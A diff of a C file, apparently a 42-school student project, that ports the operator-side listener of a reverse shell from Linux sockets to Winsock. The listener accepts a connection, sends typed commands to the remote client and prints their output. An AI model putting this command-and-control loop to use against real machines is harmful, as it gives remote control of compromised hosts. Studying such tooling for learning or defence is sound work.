@@ -1,44 +1,48 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   berkeley_server.c                                  :+:      :+:    :+:   */
+/*   winsock_server.c                                   :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2026/01/10 16:00:43 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/11 00:55:13 by joesanto         ###   ########.fr       */
+/*   Created: 2026/01/11 00:20:47 by joesanto          #+#    #+#             */
+/*   Updated: 2026/01/11 00:53:14 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <unistd.h>
-#include <stdio.h>
-#include <errno.h>
-#include <string.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <stdint.h>
-#include "libft.h"
-#include "linux_reverse_shell.h"
+#include <stdio.h>
+#include "windows_reverse_shell.h"
 
 int	main(void)
 {
-	int			server_fd;
-	int			client_fd;
+	SOCKET		server_fd;
+	SOCKET		client_fd;
 	char		*client_ip;
 	char		*command;
 	uint64_t	command_len;
 
 	printf("Waiting for incoming connections...\n");
-	if (berkeley_server_connection(&server_fd, &client_fd, &client_ip) != 0)
+	if (winsock_server_connection(&server_fd, &client_fd, &client_ip) != 0)
 	{
-		fprintf(stderr, "ERROR [%d]: %s\n", errno, strerror(errno));
+		fprintf(stderr, "An error occured!\n");
+		WSACleanup();
 		return (1);
 	}
 	while (prompt_command(&command, &command_len, client_ip))
 	{
-		write(client_fd, command, command_len);
-		usleep(500000);
+		int bytes_sent = send(client_fd, command, (int)command_len, 0);
+		if (bytes_sent == SOCKET_ERROR) {
+			fprintf(stderr, "Send failed: %d\n", WSAGetLastError());
+			break;
+		}
+		Sleep(500);
 		receive_command_output(client_fd);
 	}
-	close(server_fd);
-	close(client_fd);
+	closesocket(server_fd);
+	closesocket(client_fd);
+	WSACleanup();
 	return (SUCCESS);
 }
